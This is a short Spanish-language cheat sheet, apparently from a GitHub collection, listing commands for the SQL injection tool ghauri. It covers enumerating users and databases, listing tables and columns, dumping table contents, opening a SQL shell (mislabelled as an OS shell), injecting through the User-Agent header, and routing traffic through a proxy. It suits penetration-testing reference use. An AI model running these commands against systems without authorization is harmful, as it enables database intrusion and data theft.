# Ghauri Cheat Sheet

#### Uso simple
```
ghauri -u "<URL>"
```

#### Conocer el usuario actual
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" --current-user
```

#### Conocer la Base de Datos actual
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" --current-db
```

#### Especificar el Sistema Gestor de Base de Datos
```
ghauri -u "<URL>" --dbms=<Name-DBMS>
```

#### Listar los usuarios de la BD del sitio
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" --users
```

#### Listar las Bases de Datos del sitio
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" --dbs
```

#### Listar las tablas de una Base de Datos
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> --tables
```

#### Listar las columnas de una Tabla
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --columns
```

#### Ver contenido de ciertas Columnas de una Tabla
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> -C <Column1,Column2> --dump
```

#### Ver todo el contenido de una Tabla de una Base de Datos
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" -D <Target-DB> -T <Target-Table> --dump
```

#### Obtener un Shell de OS interactivo
```
ghauri -u "<URL>" --cookie="<Cookie-Value>" --sql-shell
```

#### Listar BD, usando un parámetro de 'User-Agent' con el método GET
```
ghauri -u '<URL>' -p User-Agent --method=GET --user-agent=NONE --threads=10 --level=3 --dbs
```

#### Enviar las peticiones a nuestro propio proxy
```
ghauri -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --user-agent=NONE --proxy=http://localhost:8080 --dbs
```

#### Testear a traves de un request guardado en un archivo
```
ghauri -r "<PATH_FILE>" --data='user=a&pass=a' -p user --user-agent=NONE --threads=2 --level=3 --proxy=http://localhost:8080 --dbs
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)